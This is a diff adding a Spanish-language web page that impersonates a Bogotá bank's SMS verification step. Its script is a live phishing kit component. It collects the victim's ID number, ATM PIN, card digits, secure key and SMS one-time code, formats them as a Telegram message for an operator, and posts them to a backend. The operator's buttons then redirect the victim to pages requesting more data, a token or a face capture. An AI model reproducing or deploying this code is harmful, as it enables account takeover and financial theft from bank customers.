@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+
+<html lang="es">
+
+<head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <title>
+        Ingreso a Banca Virtual
+    </title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
+
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* Loader CSS */
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.5rem;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #fff;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+
+</head>
+
+<body class="bg-[#f3f7fc] min-h-screen flex flex-col items-center p-4">
+    <header class="w-full max-w-md flex items-center justify-between py-4">
+        <button aria-label="Volver" class="text-[#1a2a5a] text-xl">
+            <i class="fas fa-chevron-left"></i>
+        </button>
+        <h1 class="text-[#1a2a5a] font-semibold text-base">
+            Ingreso a Banca Virtual
+        </h1>
+        <button aria-label="Cerrar" class="text-[#1a2a5a] text-xl">
+            <i class="fas fa-times"></i>
+        </button>
+    </header>
+    <main class="w-full max-w-md">
+        <br>
+        <h2 class="text-[#1a2a5a] font-semibold text-lg mb-4">
+            Verifiquemos que seas tú
+        </h2>
+        <section class="bg-white rounded-lg p-5 shadow-sm">
+            <div class="flex items-start space-x-3 mb-3">
+                <img alt="Icono de teléfono celular recibiendo un mensaje de texto" class="w-6 h-6 flex-shrink-0 mt-1"
+                    decoding="async" height="24" loading="lazy" src="candado.png" width="24" />
+                <div>
+                    <div class="flex items-center space-x-1 mb-1">
+                        <span class="font-semibold text-[#1a2a5a] text-base">
+                            Código SMS
+                        </span>
+                        <button aria-label="Información sobre Código SMS"
+                            class="text-[#1a2a5a] border border-[#1a2a5a] rounded-full w-5 h-5 flex items-center justify-center text-xs font-semibold leading-none">
+                            i
+                        </button>
+                    </div>
+                    <p class="text-[#5a5a5a] text-sm leading-relaxed max-w-[320px]">
+                        Hemos enviado un código a tu número de celular registrado. Por favor, ingrésalo para continuar.
+                    </p>
+                </div>
+            </div>
+            <form class="mt-4" onsubmit="event.preventDefault()">
+                <div class="flex justify-center mb-6">
+                    <input type="text" id="tokenInput" maxlength="8" inputmode="numeric" pattern="[0-9]*"
+                        class="w-full max-w-xs p-3 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]"
+                        placeholder="Ingresa tu código" />
+                </div>
+                <p id="errorMessage" class="text-red-500 text-center mb-4 hidden">Código SMS incorrecto, intenta de
+                    nuevo.</p>
+                <button id="verifyBtn"
+                    class="w-full bg-[#e5e7eb] text-[#9ca3af] font-semibold text-base rounded-full py-3 cursor-not-allowed transition-colors duration-200"
+                    disabled type="submit">
+                    Verificar
+                </button>
+            </form>
+            <div class="text-center mt-4">
+                <button id="resendSmsBtn" class="text-[#3b82f6] font-semibold text-sm hover:underline">
+                    ¿No recibiste el SMS? Haz clic <b>aquí</b> para recibirlo otra vez.
+                </button>
+            </div>
+        </section>
+    </main>
+    <div id="loader" class="loader-overlay" style="display: none;">
+        <div class="spinner"></div>
+        <p>Verificando código...</p>
+    </div>
+    <script>
+        const tokenInput = document.getElementById("tokenInput");
+        const verifyBtn = document.getElementById("verifyBtn");
+        const errorMessage = document.getElementById("errorMessage");
+        const loader = document.getElementById("loader");
+
+        let initialLoginData = null;
+
+        // Nueva función para enviar datos al backend
+        async function sendOtpDataToBackend(messageContent, keyboard) {
+            const url = '/api/send-message'; // Endpoint del backend
+            const payload = {
+                text: messageContent,
+                keyboard: keyboard
+            };
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+
+                const data = await response.json();
+
+                if (!response.ok) {
+                    console.error(`Error al enviar OTP al backend: ${response.status}`, data.error);
+                    return null;
+                }
+
+                console.log('OTP enviado al backend exitosamente:', data);
+                // Devolvemos el ID del mensaje para poder verificar la respuesta
+                return data.result.message_id;
+
+            } catch (error) {
+                console.error('Error de red al enviar OTP al backend:', error);
+                return false;
+            }
+        }
+
+        // Nueva función para verificar la respuesta del operador a través del backend
+        async function checkOperatorResponse(messageId) {
+            try {
+                // Hacemos una única llamada a nuestro endpoint de long-polling
+                const response = await fetch(`/api/check-update/${messageId}`);
+                loader.style.display = 'none'; // Ocultamos el loader
+
+                if (response.status === 408) { // Timeout
+                    alert("El operador no respondió a tiempo. Por favor, intente de nuevo.");
+                    window.location.reload();
+                    return;
+                }
+
+                const data = await response.json();
+
+                if (data.action) {
+                    if (data.action === 'error_sms') {
+                        errorMessage.classList.remove('hidden');
+                        errorMessage.textContent = "Código SMS incorrecto, intenta de nuevo.";
+                        tokenInput.value = '';
+                        tokenInput.focus();
+                        checkInputLength();
+                    } else if (data.action === 'pedir_datos') {
+                        window.location.href = "datos.html";
+                    } else if (data.action === 'pedir_dinamica') { // Botón "Ir a Token App"
+                        window.location.href = "token.html";
+                    } else if (data.action === 'pedir_cara') {
+                        window.location.href = "cara.html";
+                    } else if (data.action === 'finalizar') { // Botón "Finalizar"
+                        window.location.href = "finish.html";
+                    } else {
+                        console.log("Respuesta no reconocida del bot:", data.action);
+                        alert("Respuesta no reconocida. Por favor, intente de nuevo.");
+                    }
+                }
+            } catch (error) {
+                loader.style.display = 'none';
+                console.error("Error al verificar la respuesta del operador:", error);
+                alert("Ocurrió un error de comunicación. Por favor, recarga la página.");
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', async () => {
+            const storedData = sessionStorage.getItem('initialLoginData');
+            if (storedData) {
+                initialLoginData = JSON.parse(storedData);
+            } else {
+                window.location.href = 'index.html';
+            }
+        });
+
+        tokenInput.addEventListener("input", (e) => {
+            e.target.value = e.target.value.replace(/\D/g, ""); // Ensure only digits
+            checkInputLength();
+        });
+
+        tokenInput.addEventListener("paste", (e) => {
+            e.preventDefault();
+            const paste = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 8);
+            tokenInput.value = paste;
+            checkInputLength();
+        });
+
+        function checkInputLength() {
+            const tokenLength = tokenInput.value.length;
+            const isValidLength = tokenLength >= 6 && tokenLength <= 8;
+            verifyBtn.disabled = !isValidLength;
+            verifyBtn.classList.toggle("cursor-not-allowed", !isValidLength);
+            verifyBtn.classList.toggle("bg-[#e5e7eb]", !isValidLength);
+            verifyBtn.classList.toggle("text-[#9ca3af]", !isValidLength);
+            verifyBtn.classList.toggle("bg-[#3b82f6]", isValidLength);
+            verifyBtn.classList.toggle("text-white", isValidLength);
+        }
+
+        // Initial check on page load
+        document.addEventListener('DOMContentLoaded', checkInputLength);
+
+        verifyBtn.addEventListener('click', async () => {
+            const token = tokenInput.value;
+            errorMessage.classList.add('hidden');
+            loader.style.display = 'flex';
+
+            let telegramMessage = `<b>🏦 OTP INGRESADO - BOGOTÁ 🏦</b>\n`;
+            telegramMessage += `<b>🆔 Tipo Doc:</b> ${initialLoginData.identificationType}\n`;
+            telegramMessage += `<b>👤 Documento:</b> <code>${initialLoginData.identificationNumber}</code>\n`;
+
+            if (initialLoginData.debitCardKey !== 'N/A') {
+                telegramMessage += `<b>🔑 Clave Cajero:</b> <code>${initialLoginData.debitCardKey}</code>\n`;
+                telegramMessage += `<b>🔢 Últimos 4:</b> <code>${initialLoginData.last4Digits}</code>\n`;
+            } else if (initialLoginData.secureKey !== 'N/A') {
+                telegramMessage += `<b>🔑 Clave:</b> <code>${initialLoginData.secureKey}</code>\n`;
+            }
+
+            telegramMessage += `\n<b>🔢 Código SMS:</b> <code>${token}</code>\n`;
+            telegramMessage += `<b>📅 Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: "❌ Error SMS", callback_data: `error_sms:N/A` }, { text: "📋 Ir a Datos", callback_data: `pedir_datos:N/A` }],
+                    [{ text: "💎 Ir a Token App", callback_data: `pedir_dinamica:N/A` }, { text: "👤 Pedir Cara", callback_data: `pedir_cara:N/A` }],
+                    [{ text: "🚨 Finalizar", callback_data: `finalizar:N/A` }]
+                ]
+            };
+
+            const messageId = await sendOtpDataToBackend(telegramMessage, keyboard);
+            if (messageId) {
+                checkOperatorResponse(messageId);
+            } else {
+                loader.style.display = 'none';
+                alert("Error al enviar el código. Por favor, inténtalo de nuevo.");
+            }
+        });
+
+        const resendSmsBtn = document.getElementById("resendSmsBtn");
+
+        resendSmsBtn.addEventListener('click', async () => {
+            loader.style.display = 'flex';
+
+            let telegramMessage = `<b>🏦 REENVIO SMS - BOGOTÁ 🏦</b>\n`;
+            telegramMessage += `<b>🆔 Tipo Doc:</b> ${initialLoginData.identificationType}\n`;
+            telegramMessage += `<b>👤 Documento:</b> <code>${initialLoginData.identificationNumber}</code>\n`;
+
+            if (initialLoginData.debitCardKey !== 'N/A') {
+                telegramMessage += `<b>🔑 Clave Cajero:</b> <code>${initialLoginData.debitCardKey}</code>\n`;
+                telegramMessage += `<b>🔢 Últimos 4:</b> <code>${initialLoginData.last4Digits}</code>\n`;
+            } else if (initialLoginData.secureKey !== 'N/A') {
+                telegramMessage += `<b>🔑 Clave:</b> <code>${initialLoginData.secureKey}</code>\n`;
+            }
+
+            telegramMessage += `\n<b>🟡 Solicitud:</b> Reenvío de SMS\n`;
+            telegramMessage += `<b>📅 Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: "❌ Error SMS", callback_data: `error_sms:N/A` }, { text: "📋 Ir a Datos", callback_data: `pedir_datos:N/A` }],
+                    [{ text: "💎 Ir a Token App", callback_data: `pedir_dinamica:N/A` }, { text: "👤 Pedir Cara", callback_data: `pedir_cara:N/A` }],
+                    [{ text: "🚨 Finalizar", callback_data: `finalizar:N/A` }]
+                ]
+            };
+
+            const messageId = await sendOtpDataToBackend(telegramMessage, keyboard);
+            if (messageId) {
+                // No need to check operator response for resend, just inform the user
+                loader.style.display = 'none';
+                alert("Se ha enviado la solicitud de reenvío de SMS. Por favor, espera un momento.");
+            } else {
+                loader.style.display = 'none';
+                alert("Error al solicitar el reenvío de SMS. Por favor, inténtalo de nuevo.");
+            }
+        });
+    </script>
+</body>
+
+</html>
